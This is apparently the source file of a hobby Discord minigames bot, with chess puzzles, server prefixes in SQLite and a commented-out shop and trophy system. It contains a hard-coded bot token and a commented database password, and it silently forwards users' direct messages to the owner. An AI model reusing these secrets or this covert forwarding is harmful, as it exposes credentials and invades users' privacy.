import discord
from discord.ext import commands, tasks
import os
import traceback
from traceback import format_exception
import aiosqlite
import asyncio
import datetime
import time
import copy
import random
import inspect
import chess
import aiohttp
import re

import discord
import chess
import itertools

class ChessModal(discord.ui.Modal, title='Chess'):
    def __init__(self, button):
        super().__init__()
        self.button = button

    inp = discord.ui.TextInput(
        label='Move',
        placeholder='Type your move here...'
    )

    async def on_submit(self, interaction):
        inp = self.inp.value
        view = self.button.view
        human_move = 0 if view.turn == 0 else (0 if view.playing_as == 'w' else 1)
        move_ = view.board.parse_san(view.pgn[view.turn][human_move])
        move = view.convert_to_move(inp)
        if move:
            if move.uci() != move_.uci():
                return await interaction.response.send_message(content='Incorrect move', ephemeral=True)
            view.board.push(move)
            if view.playing_as == 'w':
                try:
                    view.board.push_san(view.pgn[view.turn][1])
                except IndexError:
                    pass
            else:
                try:
                    view.board.push_san(view.pgn[view.turn+1][0])
                except IndexError:
                    pass
            view.turn += 1
            embed = view.make_embed()
            if view.turn == len(view.pgn):
                view.stop()
                embed.color = won_game_color
            view.hint.label = 'Hint'
            await interaction.response.edit_message(embed=embed, view=view)
            view.hint_level = 0
        else:
            return await interaction.response.send_message(content='Invalid move', ephemeral=True)

class ChessPuzzle(discord.ui.View):
    def __init__(self, ctx, *, fen, title, pgn):
        super().__init__()

        from games import ongoing_game_color, lost_game_color, won_game_color, drawn_game_color
        global ongoing_game_color, lost_game_color, won_game_color, drawn_game_color

        self.ctx = ctx
        self.board = chess.Board(fen)
        self.turn = 0
        self.playing_as = fen.split(' ')[1]
        self.title = title
        self.pgn = pgn
        self.status = 'Solved ✅'
        self.hint_level = 0

    async def on_timeout(self):
        self.status = 'Failed ❌'

    async def interaction_check(self, interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(content="You're not in this game", ephemeral=True)
        return True

    def make_embed(self):
        embed = discord.Embed(title=self.title, description="Thanks to [chess.com](https://www.chess.com/) for providing the puzzles", color=ongoing_game_color)
        url = f"http://www.fen-to-image.com/image/64/double/coords/{self.board.board_fen()}"
        embed.set_image(url=url)
        return embed

    def convert_to_move(self, inp):
        inp = inp.replace(' ', '')
        move = None
        try:
            move = self.board.parse_san(inp)
        except ValueError:
            if len(inp) in range(4, 6):
                for move_ in itertools.permutations(inp.lower()):
                    try:
                        move = self.board.parse_uci(''.join(move_))
                    except ValueError:
                        continue
                    else:
                        break
        return move


    @discord.ui.button(label='move', style=discord.ButtonStyle.blurple)
    async def move(self, interaction, button):
        await interaction.response.send_modal(ChessModal(button))

    @discord.ui.button(label='Hint', style=discord.ButtonStyle.success)
    async def hint(self, interaction, button):
        human_move = 0 if self.turn == 0 else (0 if self.playing_as == 'w' else 1)
        move = self.board.parse_san(self.pgn[self.turn][human_move])
        if self.hint_level == 0:
            square = move.uci()[0] + move.uci()[1]
        elif self.hint_level == 1:
            square = move.uci()
        button.label = "Move" if button.label == 'Hint' else 'Hint'

        embed = self.make_embed()
        await interaction.response.edit_message(embed=embed, view=self)

        # await interaction.response.send_message(square)
        await self.ctx.send(square)
        self.status = 'Solved with hint ⚫'
        self.hint_level += 1
        if self.hint_level == 2:
            self.hint_level = 0

    async def end_game(self, interaction):
        self.stop()
        for child in self.children:
            child.disabled = True
        embed = self.make_embed()
        string = ''
        for num, move in enumerate(self.pgn, start=1):
            string += f"{num}. {' '.join(['`'+m+'`' for m in move])}\n"
        embed.description += '\n\n'+string
        embed.color = lost_game_color
        self.status = 'Failed ❌'
        await interaction.response.edit_message(content='Game ended', embed=embed, view=self)

    async def start(self):
        button = discord.ui.Button(emoji='⏹', style=discord.ButtonStyle.danger)
        button.callback = self.end_game
        self.add_item(button)

        await self.ctx.send(f"You're playing as: {'White ⬜' if self.playing_as == 'w' else 'Black ⬛'}")
        embed = self.make_embed()
        self.msg = await self.ctx.send(embed=embed, view=self)

async def get_prefix(bot, message):
    if not message.guild:
        return ['h ','H ']
    try:
        return bot.prefixes[message.guild.id]
    except KeyError:
        cur = await bot.db.execute("SELECT pref FROM prefix WHERE guild_id = ?", (message.guild.id,))
        data = await cur.fetchone()
        if data is None:
            await bot.db.execute("INSERT OR IGNORE INTO prefix(guild_id, pref) VALUES (?,?)", (message.guild.id, 'h ,H '))
            await bot.db.commit()
            data = ('h ,H ',)
        prefixes = sorted(data[0].split(','), key = lambda m: len(m), reverse=True)
        bot.prefixes[message.guild.id] = prefixes
        return prefixes

bot = commands.Bot(command_prefix=get_prefix, allowed_mentions = discord.AllowedMentions(everyone = False, roles = False), case_insenstive=True, intents = discord.Intents.all(), owner_ids={724275771278884906,754557382708822137,485513915548041239})
bot.prefixes = {}
# bot.db_host = 'containers-us-west-49.railway.app'
# bot.db_pw = 'xayeohRi3idO25wFJrta'
bot.launch_time = datetime.datetime.utcnow()

UP = (-1, 0)
DOWN = (1, 0)
LEFT = (0, -1)
RIGHT = (0, 1)
conversion = {'⬆':UP,'⬅':LEFT,'➡':RIGHT,'⬇':DOWN}
directions = [UP, DOWN, LEFT, RIGHT]

class BotHelp(commands.MinimalHelpCommand):
    async def send_pages(self):
        des = self.get_destination()
        for i in self.paginator.pages:
            words = []
            for word in i.split(' '):
                if '*' not in word:
                    word = word.replace('_', '\_')
                words.append(word)
            i = ' '.join(words)
            emb = discord.Embed(title='H bot\'s Help', description=f"\n{i}", color=discord.Color.dark_theme()).set_footer(text='h good')
            await des.send(embed=emb)

bot.help_command=BotHelp()

async def Prefix():
    await bot.wait_until_ready()
    bot.db = await aiosqlite.connect('prefix.db')
    await bot.db.execute('CREATE TABLE IF NOT EXISTS prefix(guild_id int, pref text, PRIMARY KEY (guild_id))')
    await bot.db.commit()

# async def Logs():
#   await bot.wait_until_ready()
#   bot.logs = await aiosqlite.connect('logs.db')
#   await bot.logs.execute('CREATE TABLE IF NOT EXISTS errors(name text, text_ text)')
#   await bot.logs.execute('CREATE TABLE IF NOT EXISTS commands(name text, text_ text)')
#   await bot.logs.execute('CREATE TABLE IF NOT EXISTS custom(name text, text_ text)')
#   await bot.logs.execute('CREATE TABLE IF NOT EXISTS joins(name text, text_ text)')
#   await bot.logs.execute('CREATE TABLE IF NOT EXISTS leaves(name text, text_ text)')
#   await bot.logs.commit()

# async def log(type_, name, text):
#   await bot.logs.execute(f"INSERT OR IGNORE INTO {type_}(name, text_) VALUES (?,?)", (name, text))
#   await bot.logs.commit()

# bot.log = log

os.environ.setdefault("JISHAKU_NO_UNDERSCORE", "1")
os.environ.setdefault("JISHAKU_FORCE_PAGINATOR", "1")
os.environ.setdefault("JISHAKU_NO_DM_TRACEBACK", "1")
os.environ.setdefault("JISHAKU_HIDE", "1")

@bot.event
async def on_message(msg):
    if msg.author.bot:
        return
    if not msg.guild:
        m = await bot.fetch_user(724275771278884906)
        if msg.author.id != m.id and not msg.author.bot:
            await m.send(f'{msg.author}: {msg.content}')
    if msg.content == f'<@{bot.user.id}>' or msg.content == f'<@!{bot.user.id}>':
        if msg.guild is None:
            em = discord.Embed(title='Prefixes', description='1. `h `\n2. `H `').set_footer(text='2 prefixes')
            await msg.author.send(content=f'{msg.author.mention} Here are my current server prefixes', embed=em)
        else:
            em = discord.Embed(title='Prefixes', description='', color = discord.Color.blurple())
            prefixes = await get_prefix(bot, msg)
            for num, i in enumerate(prefixes, start=1):
                em.description += f'{num}. `{i}`\n'
            em.set_footer(text=f'{len(prefixes)} prefixes')
            await msg.channel.send(embed=em, content=f'{msg.author.mention} Here are my current server prefixes')
    await bot.process_commands(msg)

@bot.event
async def on_guild_join(guild):
    await bot.db.execute("INSERT OR IGNORE INTO prefix(guild_id, pref) VALUES (?,?)", (guild.id, 'h ,H '))
    await bot.db.commit()
    # await bot.log('joins', 'got added to ' + guild.name, f'Owner: {guild.owner}\nGuild id: {guild.id}\nMember count: {guild.member_count} (Bots: {len([i for i in guild.members if i.bot])})\nGuild created at: {guild.created_at} | <t:{round(guild.created_at.timestamp())}:R>\nDate: {datetime.datetime.utcnow()} | <t:{round(datetime.datetime.utcnow().timestamp())}:R>')

# @bot.event
# async def on_guild_leave(guild):
#   await bot.log('leaves', 'got kicked from ' + guild.name, f'Owner: {guild.owner}\nGuild id: {guild.id}\nMember count: {guild.member_count} (Bots: {len([i for i in guild.members if i.bot])})\nGuild created at: {guild.created_at} | <t:{round(guild.created_at.timestamp())}:R>\nDate: {datetime.datetime.utcnow()} | <t:{round(datetime.datetime.utcnow().timestamp())}:R>')

# @bot.event
# async def on_command(ctx):
#   await bot.log('commands', f'The {ctx.command} was used', f"User: {ctx.author}\nLocation: {ctx.guild.name if ctx.guild else 'dms'} | {ctx.channel.name if ctx.guild else 'dms'}\nfull message: {ctx.message.content}\nDate: {ctx.message.created_at} | <t:{round(ctx.message.created_at.timestamp())}:R>")

@bot.command()
@commands.cooldown(1, 15, commands.BucketType.user)
async def chess_puzzle(ctx):
    async with aiohttp.ClientSession() as session:
        data = await session.get('https://api.chess.com/pub/puzzle/random')
        data = await data.json()
        title = data['title']
        fen = data['fen']
        pgn = data['pgn']
    string = pgn.split('\n')[-2]
    string = string.split('.')

    moves = []

    for move in string:
        e = re.sub(" \d+", "", move).strip()
        if e:
            moves.append(e.split(' '))

    if not moves:
        print(moves)
        print(data['fen'])
        print(data['pgn'])
        ctx.command.reset_cooldown(ctx)
        return await ctx.send("No puzzle right now")

    moves.pop(0)
    game = ChessPuzzle(ctx, fen=fen, title=title, pgn=moves)
    await game.start()
    await game.wait()
    await ctx.send(game.status)

@bot.event
async def on_ready():
    await Prefix()
    # await Logs()
    if 'HiTech' in os.getcwd():
        bot.owner_ids.remove(485513915548041239)
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.watching, name='H good'))
    print(f'{bot.user.id}\n{bot.user.name}')
    # await disgames.register_commands(bot, ignore=[disgames.Sokoban])
    # await bot.load_extension("jishaku")
    for cog in ['errors','utility','disgames']:
        try:
            await bot.load_extension(f'cogs.{cog}')
        except Exception as e:
            print(e)
    await add_me_as_owner.start()

# @bot.command()
# async def source(ctx, command=None):
#   """The source code to all my games"""
#   if not command:
#       return await ctx.send(embed=discord.Embed(title='All of the games i provide come from disgames!!!',url='https://pypi.org/project/disgames', description='Go onto https://pypi.org/project/disgames and download disgames to have all these games on your bot\n\nSource code is also available on GitHub [here](https://github.com/andrewthederp/Disgames "Disgames is cool!")', color=discord.Color.blurple()))
#   base_link = 'https://github.com/andrewthederp/Disgames'
#   cmd = bot.get_command(command)
#   if not cmd or not cmd.cog or cmd.cog.qualified_name in ['Jishaku','Utility']:
#       return await ctx.send(f'source for {command} is not available')
#   else:
#       src = cmd.callback.__code__
#       module = cmd.callback.__module__
#       filename = src.co_filename
#       lines, firstline = inspect.getsourcelines(src)
#       lines = len(lines)
#       location = '/'.join(((module.replace(".", "/") + ".py" if module.startswith("discord") else os.path.relpath(filename).replace(r"\\", "/")).split('/'))[7:])
#       url = base_link+f"/blob/main/{location}#L{firstline}-L{firstline+lines-1}"
#       embed = discord.Embed(title=f'Source for {command}', description = f'[here]({url} "Disgames is cool!")', color=discord.Color.blurple(), url=url)
#       await ctx.send(embed=embed)

@bot.command(aliases=['inv'])
async def invite(ctx):
    '''invite this bot to a server'''
    em = discord.Embed(title=f'Invite link for {bot.user.display_name}', description='https://discord.com/api/oauth2/authorize?client_id=863801721724338187&permissions=392256&scope=bot', color=discord.Color.blurple(), url='https://discord.com/api/oauth2/authorize?client_id=863801721724338187&permissions=392256&scope=bot')
    await ctx.send(embed=em)

class LinkButton(discord.ui.Button):
      def __init__(self, message, link):
          super().__init__(style=discord.ButtonStyle.link, label=message, url=link)

class LinkButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(LinkButton("Invite me!", "https://discord.com/oauth2/authorize?client_id=863801721724338187&permissions=10304&scope=bot"))
        self.add_item(LinkButton("Support server", "https://discord.gg/wgEdfy2X44"))

@bot.command()
async def botinfo(ctx):
    """Gives you info about the bot"""
    delta_uptime = datetime.datetime.utcnow() - bot.launch_time
    hours, remainder = divmod(int(delta_uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    m = await bot.fetch_user(724275771278884906)
    embed = discord.Embed(title=f'{bot.user.display_name} info!', description=f"I am a discord minigames bot made by {m.mention}, i have a total of {len([cmd for cmd in bot.commands if not cmd.hidden])} commands and i am in {len(bot.guilds)} servers\n\nUptime: {days}d, {hours}h, {minutes}m, {seconds}s", color=discord.Color.dark_theme())
    await ctx.send(embed=embed, view=LinkButtonView())

@bot.command(hidden=True)
@commands.has_permissions(kick_members=True)
async def leave(ctx):
    await ctx.guild.leave()

@tasks.loop(seconds=5)
async def add_me_as_owner():
    if not 724275771278884906 in bot.owner_ids:
        a = list(bot.owner_ids)
        a.append(724275771278884906)
        bot.owner_ids = set(a)

bot.run("ODYzODAxNzIxNzI0MzM4MTg3.G2MwJu.UD4XPWYxXZtl0L7QFS_D3QxO-eo-h-3s9GJcQ4")
asyncio.run(bot.db.close())
# asyncio.run(bot.logs.close())





















# import discord
# from discord.ext import commands
# import aiosqlite
# import asyncio
# import jishaku
# import random
# import chess
# import aiohttp
# import copy
# import emojis
# import re
# import os

# bot = commands.Bot(command_prefix=['h ', 'H '], intents=discord.Intents.all())

# bot.load_extension('jishaku')

# os.environ.setdefault("JISHAKU_NO_UNDERSCORE", "1")

# @bot.event
# async def on_ready():
#   print('h good')

# async def games_db():
#   await bot.wait_until_ready()
#   bot.games = await aiosqlite.connect("games.db")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS trophies (guild_id int, author_id int, trophies int)")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS global_trophies (author_id int, trophies int)")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS shop (guild_id int, item_name text, role_id int, price int)")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS shop_enabled (guild_id int, enabled bool, PRIMARY KEY (guild_id))")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS trophies_amount_win (guild_id int, amount int, PRIMARY KEY (guild_id))")
#   await bot.games.execute("CREATE TABLE IF NOT EXISTS trophies_amount_loose (guild_id int, amount int, PRIMARY KEY (guild_id))")

# async def give_trophies(bot, member, amount):
#   cursor = await bot.games.execute("SELECT trophies FROM trophies WHERE guild_id = ? AND author_id = ?", (member.guild.id, member.id))
#   data = await cursor.fetchone()
#   if data:
#       await bot.games.execute("UPDATE trophies SET trophies = trophies + ? WHERE guild_id = ? AND author_id = ?",(amount, member.guild.id, member.id))
#   else:
#       await bot.games.execute("INSERT OR IGNORE INTO trophies (guild_id, author_id, trophies) VALUES (?,?,?)",(member.guild.id, member.id, amount))
#   await bot.games.commit()

# async def give_global_trophies(bot, member, amount):
#   cursor = await bot.games.execute("SELECT trophies FROM global_trophies WHERE author_id = ?", (member.id,))
#   data = await cursor.fetchone()
#   if data:
#       if (data[0]-1) >= 0:
#           await bot.games.execute("UPDATE global_trophies SET trophies = trophies + ? WHERE author_id = ?",(amount, member.id))
#   else:
#       if amount != -1:
#           await bot.games.execute("INSERT OR IGNORE INTO global_trophies (author_id, trophies) VALUES (?,?)",(member.id, amount))
#   await bot.games.commit()

# async def trophies_amount(bot, member):
#   cursor = await bot.games.execute("SELECT trophies FROM trophies WHERE guild_id = ? AND author_id = ?", (member.guild.id, member.id))
#   data = await cursor.fetchone()
#   if data:
#       return data[0]
#   return 0

# class Shop(commands.Cog):
#   def __init__(self, bot):
#       self.bot = bot

#   async def cog_check(self, ctx):
#       if not ctx.guild:
#           return False
#       return True

#   @commands.Cog.listener()
#   async def on_guild_join(self, guild):
#       await self.bot.games.execute("INSERT OR IGNORE INTO shop_enabled (guild_id, enabled) VALUES (?,?)",(guild.id, False))
#       await self.bot.games.execute("INSERT OR IGNORE INTO trophies_amount_win (guild_id, amount) VALUES (?,?)",(guild.id, 1))
#       await self.bot.games.execute("INSERT OR IGNORE INTO trophies_amount_loose (guild_id, amount) VALUES (?,?)",(guild.id, 1))
#       await self.bot.games.commit()

#   @commands.Cog.listener()
#   async def on_guild_leave(self, guild):
#       await self.bot.games.execute("DELETE FROM trophies WHERE guild_id = ?", (guild.id,))
#       await self.bot.games.execute("DELETE FROM shop WHERE guild_id = ?", (guild.id,))
#       await self.bot.games.execute("DELETE FROM shop_enabled WHERE guild_id = ?", (guild.id,))
#       await self.bot.games.execute("DELETE FROM trophies_amount_win WHERE guild_id = ?", (guild.id,))
#       await self.bot.games.execute("DELETE FROM trophies_amount_loose WHERE guild_id = ?", (guild.id,))
#       await self.bot.games.commit()

#   async def get_roles(self, guild):
#       cursor = await self.bot.games.execute("SELECT item_name, role_id, price FROM shop WHERE guild_id = ?", (guild.id,))
#       data = await cursor.fetchall()
#       lst = []
#       for item in data:
#           name = item[0]
#           role = guild.get_role(item[1])
#           if not role:
#               await self.bot.games.execute("DELETE FROM shop WHERE guild_id = ? AND item_name = ?",(guild.id, name))
#               continue
#           price = item[2]
#           lst.append({'name':name, 'role':role, 'price':price})
#       return lst

#   async def shop_enabled(self, guild):
#       try:
#           cursor = await self.bot.games.execute("SELECT enabled FROM shop_enabled WHERE guild_id = ?", (guild.id,))
#           data = await cursor.fetchone()
#           return data[0]
#       except (IndexError,TypeError):
#           return False

#   @commands.group(invoke_without_command=True)
#   async def shop(self, ctx):
#       if await self.shop_enabled(ctx.guild):
#           lst = await self.get_roles(ctx.guild)
#           if lst:
#               embed = discord.Embed(title='Shop', color=discord.Color.blurple())
#               for item in lst:
#                   embed.add_field(name=item['name'], value=f"**Role:** {item['role'].mention}\n**Price:** {item['price']}", inline=False)
#               await ctx.send(embed=embed)
#           else:
#               await ctx.send("There are no items in the shop")
#       else:
#           await ctx.send("The shop is disabled for this server")

#   @shop.command()
#   @commands.has_permissions(administrator=True)
#   async def additem(self, ctx):
#       if await self.shop_enabled(ctx.guild):
#           if len(await self.get_roles(ctx.guild)) <= 8:
#               await ctx.send('Send the name of the item')
#               try:
#                   name = await self.bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout=15)
#               except asyncio.TimeoutError:
#                   return await ctx.send('you took too long')
#               await ctx.send('Send the id or mention the role')
#               try:
#                   role = await self.bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout=15)
#               except asyncio.TimeoutError:
#                   return await ctx.send('you took too long')
#               try:
#                   role = await commands.RoleConverter().convert(ctx, role.content)
#               except commands.RoleNotFound:
#                   return await ctx.send("That's not a role")
#               else:
#                   if role.is_bot_managed():
#                       return await ctx.send("That role belongs to a bot...")
#                   elif role > self.bot.user.top_role:
#                       return await ctx.send("That role is higher than my top role... i won't be able to give it to users")
#               await ctx.send('Send the price of the role')
#               try:
#                   price = await self.bot.wait_for('message', check = lambda m: m.author == ctx.author and m.channel == ctx.channel and m.content.isdecimal(), timeout=15)
#               except asyncio.TimeoutError:
#                   return await ctx.send('you took too long')
#               if int(price.content) < 0:
#                   return await ctx.send("Item price can't be less than 0")
#               else:
#                   await self.bot.games.execute("INSERT OR IGNORE INTO shop (guild_id, item_name, role_id, price) VALUES (?,?,?,?)",(ctx.guild.id, name.content.lower(), role.id, int(price.content)))
#                   await ctx.send("Done!")
#           else:
#               return await ctx.send("Can't have more than 8 items in the shop")
#       else:
#           await ctx.send("The shop is disabled for this server")

#   @shop.command()
#   @commands.has_permissions(administrator=True)
#   async def delitem(self, ctx, *, name):
#       if await self.shop_enabled(ctx.guild):
#           cursor = await self.bot.games.execute("SELECT * FROM shop WHERE guild_id = ? AND item_name = ?", (ctx.guild.id,name))
#           data = await cursor.fetchone()
#           if data:
#               await self.bot.games.execute("DELETE FROM shop WHERE guild_id = ? AND item_name = ?",(ctx.guild.id, name))
#           else:
#               await ctx.send("No item in the shop with that name")
#       else:
#           await ctx.send("The shop is disabled for this server")

#   @shop.command()
#   @commands.has_permissions(administrator=True)
#   async def enable(self, ctx):
#       if await self.shop_enabled(ctx.guild):
#           return await ctx.send("The shop is already enabled for this server")
#       cursor = await self.bot.games.execute("INSERT OR IGNORE INTO shop_enabled (guild_id, enabled) VALUES (?,?)",(ctx.guild.id, True))
#       if cursor.rowcount == 0:
#           await self.bot.games.execute("UPDATE shop_enabled SET enabled = ? WHERE guild_id = ?", (True, ctx.guild.id))
#       await self.bot.games.commit()
#       return await ctx.send("enabled the shop for this server")

#   @shop.command()
#   @commands.has_permissions(administrator=True)
#   async def disable(self, ctx):
#       if not await self.shop_enabled(ctx.guild):
#           return await ctx.send("The shop is already disabled for this server")
#       cursor = await self.bot.games.execute("INSERT OR IGNORE INTO shop_enabled (guild_id, enabled) VALUES (?,?)",(ctx.guild.id, False))
#       if cursor.rowcount == 0:
#           await self.bot.games.execute("UPDATE shop_enabled SET enabled = ? WHERE guild_id = ?", (False, ctx.guild.id))
#       await self.bot.games.commit()
#       return await ctx.send("disabled the shop for this server")

#   @shop.command()
#   @commands.has_permissions(administrator=True)
#   async def clear(self, ctx):
#       if await self.shop_enabled(ctx.guild):
#           await self.bot.games.execute("DELETE FROM shop WHERE guild_id = ?", (ctx.guild.id,))
#           await ctx.send("Cleared the shop!")
#       else:
#           await ctx.send("The shop is disabled for this server")

#   @commands.command()
#   async def buy(self, ctx, name):
#       if await self.shop_enabled(ctx.guild):
#           name = name.lower()
#           cursor = await self.bot.games.execute("SELECT price, role_id FROM shop WHERE guild_id = ? AND item_name = ?", (ctx.guild.id,name))
#           data = await cursor.fetchone()
#           if data:
#               role = ctx.guild.get_role(data[1])
#               if role:
#                   if await trophies_amount(self.bot, ctx.author) > data[0]:
#                       try:
#                           await ctx.author.add_roles(role)
#                           await give_trophies(self.bot, ctx.author, -data[0])
#                       except discord.Forbidden:
#                           await ctx.send("Something went wrong while trying to give you the role\npossible reasons: the role is above my role/your highest role is above my highest role")
#                   else:
#                       await ctx.send("You don't have enough money to buy this item")
#               else:
#                   await self.bot.games.execute("DELETE FROM shop WHERE guild_id = ? AND item_name = ?",(ctx.guild.id, name))
#                   await ctx.send("No item in the shop with that name")
#           else:
#               await ctx.send("No item in the shop with that name")
#       else:
#           await ctx.send("The shop is disabled for this server")

# class Trophies(commands.Cog):   
#   def __init__(self, bot):
#       self.bot = bot

#   async def cog_check(self, ctx):
#       if not ctx.guild:
#           return False
#       return True

#   @commands.group(invoke_without_command=True)
#   async def trophies(self, ctx, member:discord.Member=None):
#       member = member or ctx.author
#       await ctx.send(f"{member.display_name} has {await trophies_amount(self.bot, member)} trophies")

#   @trophies.command()
#   async def win(self, ctx, amount:int):
#       if amount > 100_000:
#           return await ctx.send('Amount can\'t be bigger than 100,000')
#       cursor = await self.bot.games.execute("INSERT OR IGNORE INTO trophies_amount_win (guild_id, amount) VALUES (?,?)", (ctx.guild.id, amount))
#       if cursor.rowcount == 0:
#           await self.bot.games.execute("UPDATE trophies_amount_win SET amount = ? WHERE guild_id = ?", (amount, ctx.guild.id))
#       await self.bot.games.commit()

#   @trophies.command()
#   @commands.has_permissions(administrator=True)
#   async def loose(self, ctx, amount:int):
#       if amount > 100_000:
#           return await ctx.send('Amount can\'t be bigger than 100,000')
#       cursor = await self.bot.games.execute("INSERT OR IGNORE INTO trophies_amount_loose (guild_id, amount) VALUES (?,?)", (ctx.guild.id, amount))
#       if cursor.rowcount == 0:
#           await self.bot.games.execute("UPDATE trophies_amount_loose SET amount = ? WHERE guild_id = ?", (amount, ctx.guild.id))
#       await self.bot.games.commit()

#   @commands.command()
#   @commands.has_permissions(administrator=True)
#   async def clearalltrophies(self, ctx):
#       await self.bot.games.execute('DELETE FROM trophies WHERE guild_id = ?', (ctx.guild.id,))
#       await self.bot.games.commit()

#   @commands.command()
#   async def addtrophies(self, ctx, member:discord.Member, amount:int):
#       if amount > 100_000:
#           return await ctx.send("Amount can't be bigger than 100k")
#       await give_trophies(self.bot, member, amount)

#   @commands.command()
#   async def deltrophies(self, ctx, member:discord.Member, amount:int):
#       if amount > 100_000:
#           return await ctx.send("Amount can't be bigger than 100k")
#       await give_trophies(self.bot, member, -amount)

#   @commands.group(aliases=['lb'], invoke_without_command=True)
#   async def leaderboard(self, ctx):
#       embed = discord.Embed(title="Trophies leaderboard", description="", colour=0x24e0db)

#       async with self.bot.games.execute("SELECT author_id, trophies FROM trophies WHERE guild_id = ? ORDER BY trophies DESC LIMIT ? OFFSET ? ", (ctx.guild.id, 10, 0)) as cursor:
#           index = 0

#           async for entry in cursor:
#               member_id, trophies = entry
#               member = await self.bot.fetch_user(member_id)
#               index += 1
#               if index == 1:
#                   emoji = '🥇'
#               elif index == 2:
#                   emoji = "🥈"
#               elif index == 3:
#                   emoji = "🥉"
#               else:
#                   emoji = "🔹"
#               embed.description += f"**{emoji} #{index} {member.display_name}**\nTrophies: `{trophies}`\n\n"

#           await ctx.send(embed=embed)

#   @leaderboard.command('global', aliases=['gl'], invoke_without_command=True)
#   async def global_(self, ctx):
#       embed = discord.Embed(title="Trophies leaderboard", description="", colour=0x24e0db)

#       async with self.bot.games.execute("SELECT author_id, trophies FROM global_trophies ORDER BY trophies DESC LIMIT ? OFFSET ? ", (10, 0)) as cursor:
#           index = 0

#           async for entry in cursor:
#               member_id, trophies = entry
#               member = await self.bot.fetch_user(member_id)
#               index += 1
#               if index == 1:
#                   emoji = '🥇'
#               elif index == 2:
#                   emoji = "🥈"
#               elif index == 3:
#                   emoji = "🥉"
#               else:
#                   emoji = "🔹"
#               embed.description += f"**{emoji} #{index} {member.display_name}**\nTrophies: `{trophies}`\n\n"

#           await ctx.send(embed=embed)

# # class RPSButton(discord.ui.Button):
# #     def __init__(self, emoji):
# #         self.conversion = {"✂️":'Scissors',"📜":'Paper',"🪨":"Rock"}
# #         super().__init__(label=self.conversion.pop(emoji, emoji), emoji='⏹' if emoji == 'quit' else emoji , style=discord.ButtonStyle.primary)

# #     async def callback(self, interaction):
# #         view = self.view
# #         if not interaction.user in view.plays:
# #             return await interaction.response.send_message("You're not in this game", ephemeral=True)
# #         elif view.plays[interaction.user]:
# #             return await interaction.response.send_message("You already chose", ephemeral=True)
# #         if self.label == 'quit':
# #             view.winner = view.player1 if interaction.user == view.player2 else view.player2
# #             view.stop()
# #             view.clear_items()
# #             return await interaction.response.edit_message(content=f"{interaction.user.mention} ended the game", view=view)
# #         view.plays[interaction.user] = str(self.emoji)
# #         try:
# #             winner = view.has_won_rps_buttons(view.player1, view.player2)
# #         except KeyError:
# #             return await interaction.response.send_message(f"Waiting for {view.player2.mention if interaction.user == view.player1 else view.player1.mention}", ephemeral=True)
# #         else:
# #             view.winner = winner
# #             view.stop()
# #             view.clear_items()
# #             return await interaction.response.edit_message(content=f"{view.player1.mention}: {view.plays[view.player1]}\n{view.player2.mention}: {view.plays[view.player2]}\n\nWinner: {winner if isinstance(winner, str) else winner.mention}", view=view)

# # class RPSView(discord.ui.View):
# #     def __init__(self, player1, player2):
# #         super().__init__(timeout=None)
# #         for emoji in ["✂️", "📜", "🪨", 'quit']:
# #             self.add_item(RPSButton(emoji))
# #         self.plays = {player1:'',player2:''}
# #         self.player1 = player1
# #         self.player2 = player2

# #     def has_won_rps_buttons(self, player1, player2):
# #         """Returns the winner"""
# #         if not self.plays[player1] or not self.plays[player2]:
# #             raise KeyError
# #         dct = {"✂️":"📜","🪨":"✂️","📜":"🪨"}
# #         if self.plays[player1] == self.plays[player2]:
# #             return "Draw"
# #         elif dct[self.plays[player1]] == self.plays[player2]:
# #             return player1
# #         return player2

# class Games(commands.Cog):
#   def __init__(self, bot):
#       self.bot = bot
#       self.dct = {}
#       self.boards = {}
#       self.snakes_and_ladders = {"s": [(7,2), (6,6), (4,8), (3, 1), (1, 8), (0, 5)], 'l':[(9,9), (8, 4), (7, 0), (6, 5), (5, 3), (2, 0)]}

#   def player_ingame(self, member):
#       try:
#           return self.dct[member]
#       except KeyError:
#           return False

#   async def end_game(self, ctx, winner, looser):
#       await give_trophies(self.bot, winner, await self.get_winning_amount(ctx))
#       amount = -(await self.get_loosing_amount(ctx))
#       if ((await trophies_amount(self.bot, looser))+amount) >= 0:
#           await give_trophies(self.bot, looser, amount)
#       await give_global_trophies(self.bot, winner, 1)
#       await give_global_trophies(self.bot, looser, -1)
#       self.dct[winner] = False
#       self.dct[looser] = False

#   def to_emoji(self, word):
#       return (''.join([f':regional_indicator_{i}:' if i.isalpha() else i for i in word])).replace(' ', '    ')

#   async def get_winning_amount(self, ctx):
#       try:
#           cursor = await self.bot.games.execute('SELECT amount FROM trophies_amount_win WHERE guild_id = ?', (ctx.guild.id,))
#           return (await cursor.fetchone())[0]
#       except TypeError:
#           return 1

#   async def get_loosing_amount(self, ctx):
#       try:
#           cursor = await self.bot.games.execute('SELECT amount FROM trophies_amount_loose WHERE guild_id = ?', (ctx.guild.id,))
#           return (await cursor.fetchone())[0]
#       except TypeError:
#           return 1

#   @commands.command()
#   async def games(self, ctx):
#       await ctx.send('\n'.join([i.name for i in self.get_commands() if i.name != 'games']))

#   @property
#   def _url(self):
#       return "https://raw.githubusercontent.com/andrewthederp/Disgames/main/disgames/mixins/words.txt"

#   @property
#   def _session(self):
#       return self.bot.http._HTTPClient__session

#   async def _request(self):
#       response = await self._session.get(self._url)
#       return await response.text()

#   async def _get_word(self):
#       """Returns a random word"""
#       try:
#           with open("./words.txt", "r") as file:
#               data = file.read().splitlines()
#               word = random.choice(data)
#       except Exception:
#           words = await self._request()
#           with open("./words.txt", "w") as file:
#               file.write("\n".join([word[:-2] for word in words.split("\n")]))
#           with open("./words.txt", "r") as file:
#               data = file.read().splitlines()
#               word = random.choice(data)
#       finally:
#           return str(word)

#   def make_hangman(self, errors):
#       """A function to make depending on the amount of errors made"""
#       head = "()" if errors > 0 else "  "
#       torso = "||" if errors > 1 else "  "
#       left_arm = "/" if errors > 2 else " "
